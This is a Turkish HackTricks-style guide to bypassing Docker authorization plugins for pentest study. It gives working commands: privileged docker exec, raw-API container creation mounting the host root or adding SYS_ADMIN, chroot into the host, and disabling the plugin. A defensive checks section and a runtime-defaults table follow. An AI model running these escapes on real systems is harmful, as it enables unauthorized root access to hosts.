# Çalışma Zamanı Yetkilendirme Eklentileri

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Çalışma zamanı yetkilendirme eklentileri, bir çağıranın belirli bir daemon eylemini gerçekleştirip gerçekleştiremeyeceğine karar veren ek bir politika katmanıdır. Docker klasik örnektir. Varsayılan olarak, Docker daemon'uyla iletişim kurabilen herkes üzerinde fiilen geniş kontrole sahiptir. Yetkilendirme eklentileri, kimliği doğrulanmış kullanıcıyı ve istenen API işlemini inceleyerek, isteği politika gereğince izin verip reddederek bu modeli daraltmaya çalışır.

Bu konu kendi sayfasını hak ediyor çünkü bir saldırgan zaten bir Docker API'ına veya `docker` grubunda bir kullanıcıya erişimi olduğunda sömürü modelini değiştirir. Böyle ortamlarda soru artık sadece "daemon'a erişebilir miyim?" değil, aynı zamanda "daemon bir yetkilendirme katmanı ile çevrelenmiş mi ve eğer çevrelenmişse, bu katman işlenmemiş endpoint'ler, zayıf JSON ayrıştırması veya eklenti yönetimi izinleri aracılığıyla baypas edilebilir mi?" olacaktır.

## İşleyiş

Bir istek Docker daemon'una ulaştığında, yetkilendirme alt sistemi istek bağlamını bir veya daha fazla yüklü eklentiye aktarabilir. Eklenti, kimliği doğrulanmış kullanıcı kimliğini, istek ayrıntılarını, seçili header'ları ve içerik tipi uygun olduğunda istek veya yanıt gövdesinin parçalarını görür. Birden fazla eklenti zincirlenebilir ve erişim yalnızca tüm eklentiler isteğe izin verirse sağlanır.

Bu model güçlü görünür, ancak güvenliği tamamen politika yazarının API'yi ne kadar eksiksiz anladığına bağlıdır. `docker run --privileged`'ı engelleyen ancak `docker exec`'i görmezden gelen, en üst düzey `Binds` gibi alternatif JSON anahtarlarını kaçıran veya plugin yönetimine izin veren bir eklenti, doğrudan ayrıcalık yükseltme yollarını açık bırakırken yanlış bir kısıtlama hissi yaratabilir.

## Yaygın Eklenti Hedefleri

Politika incelemesi için önemli alanlar:

- container oluşturma endpoint'leri
- `HostConfig` alanları, örn. `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` ve namespace-paylaşım seçenekleri
- `docker exec` davranışı
- plugin yönetim endpoint'leri
- niyetlenen politika modelinin dışında çalışma zamanı eylemlerini dolaylı olarak tetikleyebilecek herhangi bir endpoint

Tarihsel olarak, Twistlock'un `authz` eklentisi ve `authobot` gibi basit eğitimsel eklentiler bu modeli incelemeyi kolaylaştırdı çünkü politika dosyaları ve kod yolları endpoint'ten eyleme eşlemenin nasıl uygulandığını gösteriyordu. Değerlendirme çalışmalarında önemli ders, politika yazarının yalnızca en görünür CLI komutlarını değil, tüm API yüzeyini anlaması gerektiğidir.

## Kötüye Kullanım

İlk hedef, gerçekten nelerin bloklandığını öğrenmektir. Daemon bir eylemi reddederse, hata genellikle eklenti adını leaks ederek kullanılan kontrolün tespitine yardımcı olur:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Eğer daha kapsamlı endpoint profiling gerekiyorsa, `docker_auth_profiler` gibi araçlar kullanışlıdır; çünkü hangi API rotalarının ve JSON yapıların gerçekten plugin tarafından izinli olduğunu kontrol etme gibi tekrar eden işleri otomatikleştirirler.

Ortam özel bir plugin kullanıyorsa ve API ile etkileşim kurabiliyorsanız, hangi nesne alanlarının gerçekten filtrelendiğini listeleyin:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Bu kontroller önemlidir çünkü birçok yetkilendirme hatası kavramsal değil, alan (field) bazlıdır. Bir plugin, bir CLI desenini eşdeğer API yapısını tamamen engellemeden reddedebilir.

### Tam Örnek: `docker exec` Konteyner Oluşturulduktan Sonra Yetki Ekler

Ayrıcalıklı konteyner oluşturmayı engelleyen ancak kısıtlanmamış konteyner oluşturulmasına ve `docker exec`'e izin veren bir politika yine de atlatılabilir:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Eğer daemon ikinci adımı kabul ederse, kullanıcı policy author'ın kısıtlı olduğuna inandığı bir container içinde privileged interactive process'ı geri kazanır.

### Tam Örnek: Bind Mount Through Raw API

Bazı hatalı policies yalnızca tek bir JSON yapısını inceler. Eğer root filesystem bind mount tutarlı şekilde engellenmezse, host hâlâ mount edilebilir:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Aynı fikir `HostConfig` altında da görünebilir:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Etkisi, tam bir host filesystem escape'tir. İlginç detay, bypass'ın kernel bug'dan ziyade eksik politika kapsamından kaynaklanmasıdır.

### Tam Örnek: Unchecked Capability Attribute

Eğer politika capability ile ilgili bir attribute'u filtrelemeyi unutursa, saldırgan tehlikeli bir capability'yi yeniden kazanan bir container oluşturabilir:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
`CAP_SYS_ADMIN` veya benzer derecede güçlü bir capability mevcut olduğunda, [capabilities.md](protections/capabilities.md) ve [privileged-containers.md](privileged-containers.md) dosyalarında açıklanan birçok breakout techniques erişilebilir hale gelir.

### Tam Örnek: Eklentiyi Devre Dışı Bırakma

Eğer plugin-management operations izinliyse, en temiz bypass muhtemelen kontrolü tamamen kapatmaktır:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Bu, kontrol düzlemi (control-plane) seviyesinde bir politika hatasıdır. Yetkilendirme katmanı mevcut, ancak kısıtlaması gereken kullanıcı yine de bunu devre dışı bırakma iznine sahip.

## Checks

Bu komutlar, bir politika katmanının var olup olmadığını ve bunun tam mı yoksa yüzeysel mi göründüğünü tespit etmeye yöneliktir.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
What is interesting here:

- Plugin adını içeren reddetme mesajları bir authorization katmanını doğrular ve genellikle tam uygulamayı ifşa eder.
- Saldırganın görebildiği bir plugin listesi, disable veya reconfigure işlemlerinin mümkün olup olmadığını keşfetmek için yeterli olabilir.
- Yalnızca belirgin CLI eylemlerini engelleyen ama raw API isteklerini engellemeyen bir policy, aksi kanıtlanana kadar bypassable olarak değerlendirilmelidir.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak etkin değil | Daemon erişimi, bir authorization plugin yapılandırılmadıkça fiilen all-or-nothing şeklindedir | incomplete plugin policy, blacklists instead of allowlists, allowing plugin management, field-level blind spots |
| Podman | Not a common direct equivalent | Podman genellikle Unix permissions, rootless execution ve API exposure kararlarına Docker-style authz plugins'ten daha fazla dayanır | exposing a rootful Podman API broadly, weak socket permissions |
| containerd / CRI-O | Different control model | Bu runtimeler genellikle Docker authz plugin'leri yerine socket permissions, node trust boundaries ve üst katman orchestrator kontrollerine dayanır | mounting the socket into workloads, weak node-local trust assumptions |
| Kubernetes | Uses authn/authz at the API-server and kubelet layers, not Docker authz plugins | Cluster RBAC ve admission controls ana policy katmanıdır | overbroad RBAC, weak admission policy, exposing kubelet or runtime APIs directly |
{{#include ../../../banners/hacktricks-training.md}}
